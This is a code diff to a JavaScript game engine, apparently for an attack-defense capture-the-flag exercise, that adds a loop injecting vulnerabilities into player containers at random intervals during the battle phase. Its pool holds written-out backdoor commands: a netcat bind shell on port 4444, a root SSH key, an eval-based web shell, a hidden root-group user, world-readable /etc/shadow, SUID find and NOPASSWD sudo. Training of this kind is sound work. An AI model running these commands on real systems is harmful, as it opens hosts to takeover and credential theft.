@@ -252,7 +252,115 @@ class GameEngine {
     }
 
     loops.push(this.vulnCheckLoop(phaseEndTime, phaseName));
+    // Only inject new vulns during the battle phase
+    if (phaseName === 'battle') {
+      loops.push(this.vulnInjectionLoop(phaseEndTime));
+    }
     await Promise.all(loops);
+  }
+
+  /**
+   * Background loop that introduces new vulnerabilities at random intervals during battle.
+   * Simulates zero-days, configuration drift, and attacker persistence.
+   */
+  async vulnInjectionLoop(phaseEndTime) {
+    // Pool of injectable vulnerabilities — mix of new services and reverted patches
+    const VULN_POOL = [
+      // --- New services / backdoors ---
+      {
+        name: 'backdoor_cron',
+        description: 'Planted a backdoor cron job that copies the flag to /tmp every minute',
+        command: 'echo "* * * * * root cp /root/flag.txt /tmp/.flag_backup && chmod 644 /tmp/.flag_backup" > /etc/cron.d/maintenance-check && chmod 644 /etc/cron.d/maintenance-check',
+      },
+      {
+        name: 'netcat_listener',
+        description: 'Started a netcat backdoor listener on port 4444 that serves a shell',
+        command: 'nohup bash -c "while true; do nc -l -p 4444 -e /bin/bash 2>/dev/null; sleep 1; done" &>/dev/null &',
+      },
+      {
+        name: 'anonymous_ftp_flag',
+        description: 'Created a world-readable copy of the flag in /var/www/',
+        command: 'mkdir -p /var/www && cp /root/flag.txt /var/www/flag.bak && chmod 644 /var/www/flag.bak',
+      },
+      {
+        name: 'weak_ssh_key',
+        description: 'Added an authorized SSH key with no passphrase for root',
+        command: 'mkdir -p /root/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfakekey backdoor@attacker" >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys',
+      },
+      {
+        name: 'webshell',
+        description: 'Planted a PHP-style webshell script accessible via the web service',
+        command: 'echo \'#!/bin/bash\necho "Content-Type: text/plain"\necho ""\neval "$QUERY_STRING"\' > /opt/webapp/shell.sh && chmod 755 /opt/webapp/shell.sh',
+      },
+      // --- Reverted patches (undo defender fixes) ---
+      {
+        name: 'revert_root_password',
+        description: 'Reset root password back to "toor" (simulating configuration drift)',
+        command: 'echo "root:toor" | chpasswd',
+      },
+      {
+        name: 'revert_shadow_perms',
+        description: 'Made /etc/shadow world-readable again',
+        command: 'chmod 644 /etc/shadow',
+      },
+      {
+        name: 'revert_suid_find',
+        description: 'Re-enabled SUID on find binary',
+        command: 'chmod u+s /usr/bin/find',
+      },
+      {
+        name: 'revert_web_service',
+        description: 'Restarted the vulnerable web service on port 8080',
+        command: 'pgrep -f server.py || python3 /opt/webapp/server.py &>/dev/null &',
+      },
+      {
+        name: 'revert_cron_writable',
+        description: 'Made the backup cron script world-writable again',
+        command: 'chmod 777 /opt/scripts/backup.sh 2>/dev/null; echo "#!/bin/bash" > /opt/scripts/backup.sh; chmod 777 /opt/scripts/backup.sh',
+      },
+      {
+        name: 'revert_sudo',
+        description: 'Re-added NOPASSWD sudo for ctfservice',
+        command: 'echo "ctfservice ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/ctfservice && chmod 440 /etc/sudoers.d/ctfservice && echo "ctfservice:service123" | chpasswd',
+      },
+      {
+        name: 'new_user_backdoor',
+        description: 'Created a hidden backdoor user with root privileges',
+        command: 'useradd -m -s /bin/bash -G root -p "$(openssl passwd -1 backdoor123)" sysadmin 2>/dev/null || echo "sysadmin:backdoor123" | chpasswd',
+      },
+    ];
+
+    let injectionCount = 0;
+    while (Date.now() < phaseEndTime && !this.gameOver) {
+      // Random delay: 2-7 minutes
+      const delayMs = (120 + Math.random() * 300) * 1000;
+      await sleep(delayMs);
+      if (this.gameOver || Date.now() >= phaseEndTime) break;
+
+      // Pick a random vulnerability and a random container
+      const vuln = VULN_POOL[Math.floor(Math.random() * VULN_POOL.length)];
+      const player = CONFIG.players[Math.floor(Math.random() * CONFIG.players.length)];
+      const container = CONFIG.game.segmented ? player.dmzContainer : player.container;
+
+      injectionCount++;
+      const elapsed = Math.round((Date.now() - this.phaseStartTime) / 1000);
+
+      try {
+        await execCommand(container, vuln.command, 10000);
+        console.log(`\n[Game] ⚠️  VULNERABILITY INJECTED #${injectionCount} on ${player.id}: ${vuln.description}`);
+        logGameEvent({
+          message: `Vulnerability injected: ${vuln.name} on ${player.id}`,
+          injection: injectionCount,
+          player: player.id,
+          container,
+          vulnName: vuln.name,
+          description: vuln.description,
+          elapsedSeconds: elapsed,
+        });
+      } catch (err) {
+        // Injection failed (container down, etc.) — skip silently
+      }
+    }
   }
 
   /**
